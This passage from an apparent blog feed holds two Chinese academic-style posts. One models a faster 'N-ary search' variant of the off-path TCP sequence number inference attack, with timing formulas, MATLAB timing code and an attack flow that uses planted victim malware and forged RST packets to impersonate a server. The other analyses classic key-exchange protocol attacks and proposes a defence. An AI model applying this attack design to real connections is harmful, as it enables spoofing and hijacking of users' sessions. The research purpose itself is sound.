    <content type="html"><![CDATA[<h1 id="TCP序列号预测攻击的改进-N分查找法"><a href="#TCP序列号预测攻击的改进-N分查找法" class="headerlink" title="TCP序列号预测攻击的改进-N分查找法"></a>TCP序列号预测攻击的改进-N分查找法</h1><h2 id="一、问题的重述"><a href="#一、问题的重述" class="headerlink" title="一、问题的重述"></a>一、问题的重述</h2><p>​传输控制协议 (TCP )作为一种重要的传输协议，在其安全性方面主要使用随机的初始序列号 (ISN) 来防止旁道攻击者冒充注入数据或进行重置攻击 (reset attack) 。为此，主流防火墙提供商如$Cisco^{[1]}$，$Juniper^{[2]}$等以节约资源与增强安全性为目的，在自己的产品中增加了在防火墙中进行序列号检查的功能。但讽刺的是，防火墙的这种特性也给了攻击者通过旁道攻击获取反馈，来判断测试的序列号是否合法的机会，所以将这种攻击手段命名为“TCP序列号预测攻击”。</p><p>​在Off-Path TCP Sequence Number Inference Attack - How Firewall Middleboxes Reduce Security (Qian, Zhiyun , and Mao. Z. M. 2012) 一文中作者在32bit的序列号空间中使用类二分法(Binary-search-like)进行序列号预测在最理想情况下最长需要$log_2^{32}&#x3D;32$次迭代，这在非常时间敏感的序列号预测攻击中虽然比暴力破解所需的时间短得多，但是我们仍然可以进一步通过改进算法缩短预测时间，防止引起被攻击者警觉从而提高攻击的成功率。</p><p>​因此，在本文的研究中，重点就是要进行算法层面的改进，并综合考虑实际情况和各种影响因素（如时延、丢包等）对最终序列号预测时间的影响。</p><h2 id="二、模型假设"><a href="#二、模型假设" class="headerlink" title="二、模型假设"></a>二、模型假设</h2><p>为了使得问题更加易于理解和判断，本文作出以下合理假设：</p><ul><li>假设本文涉及的防火墙设备具有TCP序列号检查功能，且默认操作为：接受在窗口内的数据包，静默丢弃不在窗口内的数据包。</li><li>假设防火墙所设窗口大小为64K，且窗口移动方式为<em>window advancing</em>。</li><li>假设攻击者从受害者处获得反馈的方式为预先植入受害者设备的恶意软件，该软件可以检测到设备特定包计数器的值并且在受害者不知情的情况下将此信息发送给攻击者。</li></ul><p></p><h2 id="三、变量说明"><a href="#三、变量说明" class="headerlink" title="三、变量说明"></a>三、变量说明</h2><p>​本文建立模型的过程中主要涉及了以下变量，说明如下：</p><center>表 1 变量于说明</center><table><thead><tr><th align="center">变量</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">$RTT$</td><td align="center">往返时延</td></tr><tr><td align="center">$N$</td><td align="center">将调查区间分为N份</td></tr><tr><td align="center">$L_i$</td><td align="center">第i次调查的区间长度</td></tr><tr><td align="center">$WIN$</td><td align="center">TCP窗口长度</td></tr><tr><td align="center">$B$</td><td align="center">网络带宽</td></tr><tr><td align="center">$T_{trans}$</td><td align="center">传输时延</td></tr><tr><td align="center">$T_{prop}$</td><td align="center">传播时延</td></tr><tr><td align="center">$T_{proc}$</td><td align="center">处理时延</td></tr><tr><td align="center">$T_{total}$</td><td align="center">总时间</td></tr><tr><td align="center">$p$</td><td align="center">数据包数</td></tr><tr><td align="center">$MTU$</td><td align="center">最大传输单元</td></tr></tbody></table><h2 id="四、模型的建立与求解"><a href="#四、模型的建立与求解" class="headerlink" title="四、模型的建立与求解"></a>四、模型的建立与求解</h2><h3 id="4-1-模型建立"><a href="#4-1-模型建立" class="headerlink" title="4.1 模型建立"></a>4.1 模型建立</h3><p>​由于TCP序列号预测攻击对于往返时间的要求远超于对于带宽的要求，尽可能减少往返次数才能有效降低预测时间。所以改进的主要思路为依靠改进算法减少预测时的测试次数。在二分法中可以每次排除当前调查区间的一半，是因为每次发送的探测包只有一或零个可以进入防火墙内，因此存下非此即彼的特性：若为一，则一定在当前区间；反之一定在另一区间。</p><p>​不由想到：如果一次调查可以排除更大范围的区间，便可以更快速地缩小查找范围，进而预测到正确的序列号。具体方法为类二分法的推广——类N分法：将调查区间分为N个小区间进行测试，在每个小区间中依然按照原方法：在长度为$\frac{L_i}{N}​$的区间仍每间隔$2WIN​$发送报文，每个小区间共发送$\frac{L_i}{N*2WIN}​$个，其中仍然只有一个包通过。但这样做会带来一个问题：当$N&gt;2​$时区间之间就不是非此即彼的关系，收到一个反馈也无法确定哪个小区间的包通过了防火墙。针对此问题的解决方法为使用发送不同数量包的方法<strong>标记</strong>各个小区间：具体为：第$1, 2, … ,N​$个小区间内的每个报文重复发送$1, 2, …, N​$个，从而在获得反馈时也会得到对应数字，进而每次排除$\frac{N-1}{N}​$个小区间。</p><p>​使用本方法可以将序列号预测的轮数缩减到$log_N2^{32}$轮，$N$的取值越大则轮数越少，需要的时间也就越少。但在实际情况中$N$的取值不能无限增加，这一点将在下一节内容中展开讨论。</p><h3 id="4-2-模型求解"><a href="#4-2-模型求解" class="headerlink" title="4.2 模型求解"></a>4.2 模型求解</h3><p>​在序列号预测攻击的过程中，时间开销主要包括以下方面：传输时延：数据包在攻击者的设备上产生到发送到网络上的时间；传播时延：由攻击者发送的数据包在网络上进行传输直到被受害者收到的时间；处理时延：受害者接收到数据包后对其进行处理所需的时间；反馈时延：预先植入受害者设备的恶意软件向攻击者发送反馈所需的时间（此时延也包括传输、传播、处理时延三部分，但由于其较为稳定，故可以简化整合讨论）。接下来本文将由理想条件出发，逐步达到接近真实情况下所需的总时间，并尝试求解出$N$的最佳取值。</p><h4 id="4-2-1-理想条件下的模型"><a href="#4-2-1-理想条件下的模型" class="headerlink" title="4.2.1 理想条件下的模型"></a>4.2.1 理想条件下的模型</h4><p>​在此情况下，我们假设只存在传播时延且恒定，包括攻击者发送数据包和从受害者处接受反馈两个过程，传输时延和处理时延不计。此时我们将传播时延记为：<br>$$<br>T_0 &#x3D; RTT<br>$$<br>​其次，我们假设网络带宽为无限大，即在同一时间可以发送任意数量的数据包，总的数据包量在这种情况下为无关变量，不加考虑。则完成一次序列号预测的理论最长时间为：<br>$$<br>T_{total}&#x3D;log_N2^{32}*RTT<br>$$<br>​可以明显看出此时预测的总时间只与$N$负相关，$N$的值越大则总时间越短。从下图中也可以看出：预测所需要的总时间在$N$的值增大的同时不断减少，且总时间在$N&#x3D;2到N&#x3D;10$之间迅速从$32RTT$下降到$10RTT$左右，之后则平稳下降。最极限的情况为当$N&#x3D;2^{32}$时只需一个$RTT​$便可完成。</p><p><img src="http://adamyoung71.github.io/img/in-post/post-tcp-inference/%E7%90%86%E6%83%B3%E6%83%85%E5%86%B5%E6%97%B6%E9%97%B4%E5%9B%BE.jpg" alt="理想情况时间图"></p><h4 id="4-2-2-进一步增加限制条件的模型求解"><a href="#4-2-2-进一步增加限制条件的模型求解" class="headerlink" title="4.2.2 进一步增加限制条件的模型求解"></a>4.2.2 进一步增加限制条件的模型求解</h4><p>​在现实情况中，网络带宽不可能为无限大，所以在攻击者发送更多数据包的同时也会相应地增加发送所需的时间。此处，我们假设使用4G网路进行通信，以中国联通平均带宽$B&#x3D;3\ MB&#x2F;s$为基准，假设上传和下载带宽相同。而对于攻击者所发送的数据包和接收到的反馈包来说，其包内数据部分不需要过多的内容，故假设每一个$TCP$数据包的最大传输单元（$Maximum Transmission Unit-MTU$）为除首部20字节外再加10字节的数据共计30字节；方程如下。</p><p>$$<br>T_{prop}&#x3D;log_N^{4G}t_{prop}<br>$$</p><p>$$<br>T_{trans}&#x3D;\frac{MTU*p}{B}<br>$$</p><p>$$<br>T_{total}&#x3D;T_{prop}+T_{trans}<br>$$</p><p>$$<br>p&#x3D;\sum_{i&#x3D;1}^{log_N^{4G}}\frac{L_i}{2WIN}\sum_{j&#x3D;1}^{N}j<br>$$</p><p>$$<br>L_i&#x3D;\frac{4G}{N^{i}}<br>$$</p><p>​联立上述式子，可以得出最终需要的时间为：<br>$$<br>T_{total} &#x3D; log_N^{4G}t_{prop}+\frac{G\ MTU\ N(N^{log_N^{4G}}-1)(N-1)}{B\ N^{log_N^{4G}}WIN(N-1)}<br>$$<br>​而对于往返时延，此情形下，传输时延不应与传播时延、处理时延合并为固定的$RTT$，而应该单独考虑。此处设为$t_{prop}$，其中包括为了避免失序而增加的填充。通过文章中的数据可计算出此值和$\frac{MTU}{B}$的大致值分别为：$0.1775$和$0.000044$。</p><p>​既然已经得到时间总函数，接下来就是对其进行分析。可以看出：此式第一部分为总的往返时延，而第二部分则是发送全部数据包所用的总时间。按照经验判断，当$N$较小时发送的总数据包数量也较小，所以左边是主导因素；而当$N$达到某一数值后，发送数据包所用的时间将与总往返时延达到同一量级。接下来将带宽与MTU的值代入，此时总时间就成为了$N$的单变量函数。在MATLAB中用不同的N值进行测试结果如下：</p><p><img src="http://adamyoung71.github.io/img/in-post/post-tcp-inference/%E6%94%B9%E8%BF%9B.jpg" alt="改进"></p><p>​可以看出，序列号预测所用的总时间从$N&#x3D;2$的10秒左右随着$N$的增大先缩短，到$N&#x3D;4$时达到最小值约7.65秒，随后因为发送的数据包数的增多时间又逐步延长。这一结果很好地符合了预测，得出$N&#x3D;4$为当前情况的最优解。</p><h4 id="4-2-3进一步优化模型"><a href="#4-2-3进一步优化模型" class="headerlink" title="4.2.3进一步优化模型"></a>4.2.3进一步优化模型</h4><p>​在上一节的论述中，我们假定每一次序列号预测时$N$的值都不发生变化，而容易想到的是在探测空间缩小的时候所发送的数据包数量也会急剧缩小，所以引出此处的对模型的进一步优化：动态设置$N$的值使之根据轮数的不同而变化，例如在开始的几轮为了避免发送过多的探测数据包而使用较小的$N$，再在之后的轮次中为了缩短总时间而使用较大的$N$值。设前一过程进行$m$轮，后一过程进行$n$轮。此时的方程为：</p><p>$$<br>T_{total}&#x3D;T_{prop}+T_{trans}<br>$$</p><p>$$<br>T_{prop}&#x3D;(m+n)t_{prop}<br>$$</p><p>$$<br>T_{trans}&#x3D;\frac{MTU*p}{B}<br>$$</p><p>$$<br>L_i&#x3D;\begin{cases}<br>\frac{4G}{N_1^i} &amp; i&#x3D;m\<br>\frac{4G}{N_1^mN_2^i} &amp; i&#x3D;n\<br>\end{cases}<br>$$</p><p>$$<br>p&#x3D;\sum_{i&#x3D;1}^m\frac{N_1(N_1+1)G}{N_1^i\ WIN}+\sum_{i&#x3D;1}^n\frac{N_2(N_2+1)G}{N_1^mN_2^i\ WIN}<br>$$</p><p>联立得到总时间：</p><p>$$<br>T_{total}&#x3D;(m+n)t_{prop}+\frac{MTU}{B}(\frac{GN_1(N_1^m-1)(N_1+1)}{N_1^m\ WIN(N_1-1)}+\frac{GN_2(N_2^n-1)(N_2+1)}{N_1^mN_2^n\ WIN(N_2-1)})<br>$$<br>​</p><p>此时参数共有$N_1, N_2,m$三个，$n$可以由$m$推出：$n&#x3D;log_{N2}\frac{4G}{N_1^m}$。所以构造数组对其进行检验得到结果为当$N_1&#x3D;2,N_2&#x3D;4,m&#x3D;8$时的最短时间可以达到3.5秒左右，相比于原方案有一倍左右的提升，非常可观。</p><h4 id="4-2-3-攻击模型"><a href="#4-2-3-攻击模型" class="headerlink" title="4.2.3 攻击模型"></a>4.2.3 攻击模型</h4><p><img src="http://adamyoung71.github.io/img/in-post/post-tcp-inference/attack-model.png" alt="attack-model"></p><p>​本模型应用在攻击模型中的流程大致为：首先，当受害者向合法服务器发送TCP连接请求时，其设备上预先植入的恶意软件会向攻击者报告这一信息；而在服务器对受害者进行回应后，攻击者会伪造大量的RST包使得服务器重置此连接，使得受害者不能正常完成三次握手从而建立TCP连接。接下来就是利用本文的模型进行序列号预测，并在预测成功后假冒合法服务器向受害者发送信息。</p><h2 id="五、模型的评价"><a href="#五、模型的评价" class="headerlink" title="五、模型的评价"></a>五、模型的评价</h2><p>​本文从“类二分法”的TCP序列号预测的算法出发，提出了“类N分法”预测序列号的改进算法，该算法可以有效减少探测序列号所需的轮数从而减少所需的时间，可以有效地提升预测的成功率。而之后对其的进一步改进又通过减少预测前期发送大量数据包的开支从而减少最终时间。</p><p>​本模型当前还是理论模型，一些参数是从日常经验或论文中得到，由于水平限制并不能提供实际的实验情景并通过测量得出更加客观的参数，所以还会继续进行完善。</p><h2 id="六、参考文献"><a href="#六、参考文献" class="headerlink" title="六、参考文献"></a>六、参考文献</h2><p>[1] Cisco. Cisco ASA 5500 Series Configuration Guide using the CLI, 8.2.</p><p>[2]  Juniper. Stateful Inspection Firewalls.</p><p>[3] Qian, Zhiyun , and Z. M. Mao . “ [IEEE 2012 IEEE Symposium on Security and Privacy (SP) Conference dates subject to change - San Francisco, CA, USA (2012.05.20-2012.05.23)] 2012 IEEE Symposium on Security and Privacy - Off-path TCP Sequence Number Inference Attack - How Firewall Middleboxes Reduce Security.” 2012:347-361.</p><h2 id="七、附录"><a href="#七、附录" class="headerlink" title="七、附录"></a>七、附录</h2><ol><li><p>MATLAB代码：</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-comment">%理想情况</span><br>syms L_i N i_ WIN G;<br>L_i = G/power(N, i_);<br>L=L_i/(<span class="hljs-number">2</span>*WIN);<br>p1 = symsum(i_,<span class="hljs-number">1</span>,L);<br>p2 = symsum(p1, i_, <span class="hljs-number">1</span>, <span class="hljs-built_in">log</span>(G)/<span class="hljs-built_in">log</span>(N))<br></code></pre></td></tr></table></figure></li><li><p>优化算法代码：</p> <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">[T_total]</span>=<span class="hljs-title">A2</span><span class="hljs-params">(n1, n2, M)</span></span><br>syms T_total T_trans T_prop j_ k_ i_ G WIN N1 N2 m n MTU B;<span class="hljs-comment">%创建变量</span><br>p1=N1.*(N1+<span class="hljs-number">1</span>).*G./(power(N1,i_).*WIN);<br>p2=N2.*(N2+<span class="hljs-number">1</span>).*G./(power(N1,m).*power(N2,i_).*WIN);<br>p=symsum(p1,i_,<span class="hljs-number">1</span>,m)+symsum(p2,i_,<span class="hljs-number">1</span>,n);<span class="hljs-comment">%数据包总数量</span><br>T_total=<span class="hljs-number">0.000044</span>.*p+(m+n).*<span class="hljs-number">0.1775</span>;<span class="hljs-comment">%总时间</span><br>T_total=subs(T_total,N1,n1);<br>T_total=subs(T_total, N2, n2);<br>T_total=subs(T_total, G, power(<span class="hljs-number">2</span>,<span class="hljs-number">30</span>));<br>T_total=subs(T_total, m, M);<br>T_total=subs(T_total, WIN, power(<span class="hljs-number">2</span>,<span class="hljs-number">16</span>));<br>T_total=subs(T_total, n, <span class="hljs-built_in">log</span>(power(<span class="hljs-number">2</span>,<span class="hljs-number">32</span>)./power(n1,M))./<span class="hljs-built_in">log</span>(n2));<br>T_total=vpa(T_total);<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Computer Network</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于N-H协议的安全通信协议设计</title>
    <link href="/2019/10/01/2019-10-01-%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/"/>
    <url>/2019/10/01/2019-10-01-%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/</url>
    
    <content type="html"><![CDATA[<h1 id="安全通信协议的一次尝试"><a href="#安全通信协议的一次尝试" class="headerlink" title="安全通信协议的一次尝试"></a>安全通信协议的一次尝试</h1><p><strong>摘要</strong></p><p>当前网络通信安全已经成为小到影响人们生产生活，达到影响社会经济发展的重要因素，而网络通信协议的安全性也就至关重要。本文中作者简要描述了几个经典的密钥交换和认证协议，并对这些协议的可能被攻击的方式和原因进行了描述，总结出了设计安全协议的一般原则。之后作者从这些原则出发，设计出了一个能够抵抗大多数协议攻击方式的密钥交换及认证协议。</p><h3 id="一、协议描述"><a href="#一、协议描述" class="headerlink" title="一、协议描述"></a>一、协议描述</h3><h4 id="1-Needham-Schroeder协议"><a href="#1-Needham-Schroeder协议" class="headerlink" title="1. Needham-Schroeder协议"></a>1. Needham-Schroeder协议</h4><p><strong>协议目的</strong>基于认证服务器实现双向认证和密钥交换。</p><p><strong>变量表</strong></p><table><thead><tr><th>变量</th><th>含义</th></tr></thead><tbody><tr><td>$T$</td><td>Trent</td></tr><tr><td>$R_i$</td><td>i生成的随机数</td></tr><tr><td>$E_i$</td><td>使用i的密钥进行加密</td></tr><tr><td>$K$</td><td>会话密钥</td></tr><tr><td>$M$</td><td>消息</td></tr><tr><td>$A\ and\ B$</td><td>通信双方（Alice，Bob）</td></tr></tbody></table><p><strong>协议流程</strong></p><ol><li><p>$(A\rightarrow T):A,B,R_A​$</p></li><li><p>$(T\rightarrow A):E_A(R_A,B,K,E_B(K,A))​$</p></li><li><p>$(A\rightarrow B):E_B(K,A)$</p></li><li><p>$(B\rightarrow A):E_k(R_B)$</p></li><li><p>$(A\rightarrow B):E_K(R_B-1)$</p></li><li><p>$(A\leftrightarrow B):E_k(M&#x3D;{\dots})$</p><p><img src="/../img/in-post/post-secure-protocol/N-S-protocol.png" alt="N-S-protocol"></p></li></ol><p><strong>协议描述</strong></p><ol><li>Alice想要与Bob进行通信，向认证服务器Trent发送通信双方$A,B$，与一个自己生成的随机数$R_A$。</li><li>Trent在收到Alice的消息后使用其与Alice的共享密钥$E_A$加密前一消息中的随机数，$B$，其为Alice和Bob分配的会话密钥$K$和由Trent与Bob的共享密钥所加密的$(K,A)$。</li><li>Alice收到消息后进行解密，确认随机数和通信方正确后保存会话密钥$K$，并将消息的最后一部分发送给Bob，使得Bob可以知道与其进行通信的对象和会话密钥。</li><li>Bob对消息进行解密后向Alice发送使用会话密钥加密的随机数。</li><li>Alice收到后进行解密并将此随机数减一后再使用会话密钥加密后发回给Bob。</li><li>此时，Alice和Bob的认证和密钥交换已经完成，双方可以在会话密钥下进行保密通信。</li></ol><p><strong>攻击方式</strong></p><ol><li><p>消息重放攻击</p><p>由于在上述流程中消息（4）不具有新鲜性，所以如果攻击者获知以前的一个工作密钥，则可以通过重放消息（4）于Bob建立会话。</p></li></ol><p><strong>攻击原因</strong></p><p>​攻击者利用消息的再生能力生成诚实用户所期望的消息格式，并重新发送，</p><h4 id="2-Needham-Schroeder公钥认证协议"><a href="#2-Needham-Schroeder公钥认证协议" class="headerlink" title="2. Needham-Schroeder公钥认证协议"></a>2. Needham-Schroeder公钥认证协议</h4><p><strong>协议目的</strong>通信双方在可信第三方的条件下使用公钥系统建立行的共享密钥并实现认证。</p><p><strong>变量表</strong></p><table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td>$A\ and\ B$</td><td>通信双方Alice与Bob</td></tr><tr><td>$T$</td><td>可信第三方</td></tr><tr><td>$K_{ij}$</td><td>i与j的公共密钥</td></tr><tr><td>$T_i$</td><td>由i生成的时间戳</td></tr><tr><td>$M_i,N_i$</td><td>由i生成的随机数</td></tr><tr><td>$K_i^{-1}$</td><td>$i$的私钥</td></tr></tbody></table><p><strong>协议流程</strong></p><ol><li>$(A\rightarrow T): A,B​$</li><li>$(T\rightarrow A):{K_b,B}_{K_t^{-1}}$</li><li>$(A\rightarrow B): {N_a,A}_{K_b}​$</li><li>$(B\rightarrow T):A,B$</li><li>$(T\rightarrow B):{K_a,A}_{K_t^{-1}}​$</li><li>$(B\rightarrow A): {N_a,N_b}_{K_a}​$</li><li>$(A\rightarrow B): {N_b}<em>{K</em>{b}}​$</li></ol><p><strong>协议描述</strong></p><ol><li>Alice想要与Bob进行通信，首先向Trent表明两人的身份。</li><li>Trent返回使用自己私钥签名的Bob 的公钥。</li><li>Alice使用Bob的公钥加密一个随机数并表明自己的身份。</li><li>Bob使用私钥解密后向Trent确认，发送Alice和自己的身份。</li><li>同样的，Trent返回自己签名的Alice的公钥。至此，Alice和Bob双方已经获得了对方的公钥。</li><li>Bob使用Alice的公钥加密先前受到的随机数和自己产生的另一个随机数。</li><li>Alice使用Bob的公钥回复Bob产生的随机数。</li></ol><p><strong>攻击方式</strong></p><p>中间人攻击：中间人Malice冒充Alice与Bob建立了共享秘密。同时也是预言机攻击，因为Alice与Malice建立通信后Malice就可以获得由Alice无意中解密的Bob的随机数。</p><ol><li>$(A\rightarrow M): {N_a,A}_{K_m}$</li><li>$(M\rightarrow B):{N_a,A}<em>{K</em>{b}}$ </li><li>$(B\rightarrow M):{N_a,N_b}_{K_a}$</li></ol><p><strong>攻击原因</strong></p><p>传递的消息由公钥加密，而公钥是公开的，无法确定消息来源。同时在步骤6，7中Alice无意中将Bob生成的随机数解密，使得攻击者能够利用此解密结果通过Bob最后的验证。</p><h4 id="3-Neuman-Stubblebine协议"><a href="#3-Neuman-Stubblebine协议" class="headerlink" title="3. Neuman-Stubblebine协议"></a>3. Neuman-Stubblebine协议</h4><p><strong>协议目的</strong>通信双方在可信第三方的条件下实现认证及密钥交换。 </p><p><strong>变量表</strong>同上。</p><p><strong>协议流程</strong></p><ol><li><p>$(A\rightarrow B):A,N_a$</p></li><li><p>$(B\rightarrow T):B,{A,N_a,T_b}<em>{K</em>{bt}},N_b$</p></li><li><p>$(T\rightarrow A):{B,N_a,K_{ab},T_b}<em>{k</em>{at}},(A,K_{ab},T_b),N_b​$</p></li><li><p>$(A\rightarrow B):{A,K_{ab},T_b}<em>{K</em>{bt}},{N_b}<em>{K</em>{ab}}$</p></li><li><p>$(A\rightarrow B):M_a,{A,K_{ab},T_b}<em>{K</em>{bt}}$</p></li><li><p>$(B\rightarrow A):M_b,{M_a}<em>{K</em>{ab}}​$</p></li><li><p>$(A\rightarrow B):{M_b}<em>{K</em>{ab}}$</p><p><img src="/../img/in-post/post-secure-protocol/Neuman-Stubblebine.png" alt="Neuman-Stubblebine"></p></li></ol><p><strong>协议描述</strong></p><ol><li>Alice告知Bob想要与其进行安全通信。将其身份与一随机数发送给Bob。</li><li>Bob收到消息后生成自己的随机数与一个时间戳，并使用自己与Trent的共有密钥加密后发送给Trent。</li><li>Trent收到消息后生成一个会话密钥，还将此会话密钥使用与Bob的共有密钥加密后发送给Alice。</li><li>Alice将消息后半部分转发给Bob，同时验证$N_a​$是否为开始时的值。而Bob则会验证$T_b​$和$N_b​$与开始时一致。</li><li>Alice向Bob发送先前从Trent处收到的信息，并附加一个新的随机数。</li><li>Bob也发送一个新的随机数并将Alice的随机数用会话密钥加密后一并发回。</li><li>Alice将Bob 的随机数使用会话密钥加密后发回，Bob验证无误后，此时通信已经成功建立。</li></ol><p><strong>攻击方式</strong>   </p><ul><li>归因于类型缺陷攻击：由于协议中未定义变量的类型，所以攻击者Malice可以使用一次性的Nonce代替共享密钥，而Malice只需要将此Nonce设置为一个对于当前加解密算法有效的密钥即可。又因为Trent返回的票据与Bob向Trent发送的请求信息有着相似的结构，所以只需要截获Bob所发送的信息，就可以将此信息作为虚假票据发给Bob，而Bob则无法判断其正确性。</li></ul><p><strong>攻击原因</strong></p><p>​协议中的消息部分的类型信息不明确。消息（2）与消息（4）的加密部分有着非常相似的结构，区别仅仅是第二部分是Nonce还是会话密钥，又因为Nonce是公开的，Alice就可以反射这条消息，而Bob无法确认此消息是否来自Trent，但确实可以使用其与Trent的共享密钥解密，则Bob相信Nonce为共享密钥。则Alice不通过Trent的认证就与Bob建立了共享密钥。</p><h4 id="4-Otway-Rees协议"><a href="#4-Otway-Rees协议" class="headerlink" title="4. Otway-Rees协议"></a>4. Otway-Rees协议</h4><p><strong>协议目的</strong>使得通信双方通过可信第三方交换会话密钥。</p><p><strong>变量表</strong>同上。</p><p><strong>协议流程</strong></p><ol><li><p>$(A\rightarrow B):M,A,B,{N_a,M,A,B}<em>{K</em>{at}}​$</p></li><li><p>$(B\rightarrow T):M,A,B,{N_a,M,A,B}<em>{K</em>{at}},{N_b,M,A,B}<em>{K</em>{bt}}​$</p></li><li><p>$(T\rightarrow B):M,{N_a,K_{ab}}<em>{K</em>{at}},{N_b.K_{ab}}<em>{K</em>{bt}}$</p></li><li><p>$(B\rightarrow A):M,{N_a,K_{ab}}<em>{K</em>{at}}$</p><p><img src="/../img/in-post/post-secure-protocol/otway-rees.png" alt="otway-rees"></p></li></ol><p><strong>协议描述</strong></p><ol><li>Alice想要与Bob建立通信，向其发送通信双方名称和一Nonce，还有Alice与可信服务器Trent的共享密钥加密的随机数和通信方。</li><li>Bob收到消息后向Trent转发消息的加密部分，并添加使用自己与Trent共享密钥加密的通信双方和自己生成的一个随机数。</li><li>Trent返回用于Alice和Bob分别的共享密钥加密的会话密钥。</li><li>Bob收到消息解密后检查$N_b$是否正确，并把Alice的部分转发给Alice。</li><li>Alice解密后确认$N_a$是否正确，此时双方密钥交换已经完成。</li></ol><p><strong>攻击方式</strong></p><ul><li>归因于类型缺陷攻击：由于Alice在第一条消息中的随机数是以明文形式发送，而且在最后一条消息Alice获取密钥的消息格式与第一条相似，都包含相同而一个随机数，所以攻击者Malice就可以冒充Bob，将Alice发送给其的第一条消息发回给Alice，由于无法判定变量类型，Alice会将随机数外的数据$M||A||B$当作会话密钥，此时Malice就在未经可信第三方Trent的允许下与Alice建立了通信。</li></ul><p><strong>攻击原因</strong></p><p>​通信主体无法确认消息中变量的类型。在消息（4）中读取到Nonce后Alice就会将之后的任何内容都当作为会话密钥，而且此消息与消息（1）类似，攻击者就利用这一点，又因为M是明文，就可以发回第一条消息，而Alice无法确认消息来源，只能相信消息从Trent来。</p><h3 id="二、安全协议的要点"><a href="#二、安全协议的要点" class="headerlink" title="二、安全协议的要点"></a>二、安全协议的要点</h3><p>协议的安全性主要包括时效性，机密性、完整性、认证性和不可抵赖性。在通信协议中如果没有将这些因素全部考虑在内就会存在可能的安全隐患。</p><h4 id="1-协议缺陷的类型"><a href="#1-协议缺陷的类型" class="headerlink" title="1. 协议缺陷的类型"></a>1. 协议缺陷的类型</h4><ol><li>基本协议缺陷：在安全协议的设计中没有或者很少防范攻击者的攻击。</li><li>口令&#x2F;密钥猜测缺陷：用户从常用词或简单的组合中选取口令，从而使攻击者能够进行口令猜测攻击；或者选取了不安全的伪随机数生成算法构造密钥，使得攻击者可以恢复该密钥。</li><li>陈旧消息攻击（重放攻击）：在通信过程中没有保证消息的新鲜性，从而使得攻击者可以通过重放消息进行攻击。</li><li>中间人攻击：攻击者将自己伪装于通信双方之间进行通信。</li><li>预言机攻击：通信主体无意间为攻击者执行了一个密码运算，此主体被认为用作了预言机，就会可能被诱导执行某个协议的一些步骤从而帮助攻击者得到某些原本无法得到的信息。</li><li>交错攻击：攻击者将某个协议的两个或多个运行实例安排为以交错的方式运行，</li><li>平行会话攻击：在攻击者的安排下一个协议的两个或多个运行并发执行，从而从一个会话中得到其他会话中困难性问题的答案。</li><li>反射攻击：当一个诚实的主体给某个意定的通信方发送消息时，攻击者截获该消息，并将该消息返回给消息的发送者。目的是欺骗消费者提供“预言服务”。</li><li>归因于类型缺陷攻击：由于协议中消息中变量类型不明确导致攻击者可以把其他类型信息当作密钥从而导致协议安全性被破环。</li><li>密码服务滥用攻击：l协议中的密码算法没有提供正确的保护，从而在协议中缺少所需要的密码保护。</li><li>前向保密失败：过去泄露的影响到后来的消息安全。</li></ol><h4 id="2-安全协议"><a href="#2-安全协议" class="headerlink" title="2. 安全协议"></a>2. 安全协议</h4><p>通过以上描述，我们可以总结出安全通信协议所需要的要素：</p><ol><li>需要有随机数或挑战值来确保消息的新鲜性。由于单纯靠时间戳会受到允许时间之内的重放消息，单纯使用挑战值又会因为存储的挑战值越来越多影响性能，故两者将配合使用。</li><li>尽量提供机制认证消息来源，如签名机制。</li><li>不能随意发送所收到加密消息的解密结果，不能充当预言机。</li><li>协议中的各个消息不应能被修改、合成为另外消息的应答。</li><li>协议的两个实例之间不应有任何相关性，且一个实例中的任何消息不应成为其他实例的回应。</li><li>协议应该提供机制确认消息中的变量类型，以此预防归因于类型缺陷的攻击。</li><li>提供机制确保消息完整性。</li><li>过去泄漏的信息不应该影响到后来的消息。</li></ol><h3 id="三、安全协议设计"><a href="#三、安全协议设计" class="headerlink" title="三、安全协议设计"></a>三、安全协议设计</h3><p>基于上述原则，本文将设计一种安全的密钥交换和认证协议，并可以抵抗上述所有的攻击方式。首先需要作出一些必要的假设</p><p><strong>协议假设</strong></p><ul><li>存在可信第三方Trent。</li><li>Trent与任意通信主体都有共享密钥，此密钥可以通过公钥系统进行分发。</li><li>攻击者不能破解任何自己不能解密的内容。</li><li>消息在传播中不会丢失或改变。</li><li>消息的各个部分间需要加上特定填充（padding），而且此填充与消息内容不会碰撞。通信主体在接收到消息后先要进行填充搜索，如在消息$M,A,B,{M,A,B,N_a}<em>{K</em>{at}}$中接收方可以区分共有四个部分，即使可能不知道这四个部分分别是什么消息类型，同时Trent在解密第四部分后同样可以判断出共有四个部分。</li></ul><p><strong>协议流程</strong></p><ol><li><p>$(A\rightarrow B):M,A,B,{N_A,M,A,B}<em>{K</em>{AT}}$</p></li><li><p>$(B\rightarrow T):M,A,B,{N_A,M,A,B}<em>{K</em>{AT}},{N_B,M,A,B}<em>{K</em>{BT}}$</p></li><li><p>$(T\rightarrow B):M,{N_A,M,A,B,K_{AB}}<em>{K</em>{AT}},{N_B,M,A,B,K_{AB}}<em>{K</em>{BT}}​$</p></li><li><p>$(B\rightarrow A):M,A,B,{N_A,M,A,B,K_{AB}}<em>{K</em>{AT}}​$</p></li><li><p>$(A\rightarrow B):M,A,B,{M,N_{A2},A,B}<em>{K</em>{AB}}​$</p></li><li><p>$(B\rightarrow A): M,A,B,{M,N_{A2}-1,A,B}<em>{K</em>{AB}}$</p><p><img 